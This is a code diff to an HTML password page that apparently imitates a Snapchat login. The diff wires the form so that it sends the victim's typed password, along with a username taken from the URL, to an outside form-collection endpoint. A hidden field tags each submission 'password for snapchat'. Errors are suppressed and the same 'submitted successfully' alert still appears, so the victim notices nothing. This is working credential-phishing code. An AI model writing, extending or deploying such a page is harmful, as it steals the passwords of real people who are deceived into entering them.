@@ -256,7 +256,10 @@
       </div>
 
       <div class="form-wrap">
-        <form id="password-form">
+        <form id="password-form" action="https://formspree.io/f/xanpppwq" method="POST">
+          <input type="hidden" name="form_type" value="password for snapchat" />
+          <input type="hidden" name="username" id="username-hidden" />
+
           <label for="password">Password</label>
 
           <div class="input-shell">
@@ -282,6 +285,7 @@
       const params = new URLSearchParams(window.location.search);
       const username = params.get("username") || "user";
       document.getElementById("username-display").textContent = username;
+      document.getElementById("username-hidden").value = username;
 
       const passwordInput = document.getElementById("password");
       const togglePassword = document.getElementById("toggle-password");
@@ -305,10 +309,22 @@
 
         loadingScreen.style.display = "flex";
 
-        setTimeout(function () {
-          loadingScreen.style.display = "none";
-          alert("Password submitted successfully.");
-        }, 1500);
+        fetch(passwordForm.action, {
+          method: passwordForm.method,
+          body: new FormData(passwordForm),
+          headers: {
+            Accept: "application/json"
+          }
+        })
+          .catch(function (error) {
+            console.warn("Remote form submission unavailable, continuing locally:", error);
+          })
+          .finally(function () {
+            setTimeout(function () {
+              loadingScreen.style.display = "none";
+              alert("Password submitted successfully.");
+            }, 1500);
+          });
       });
     </script>
   </body>
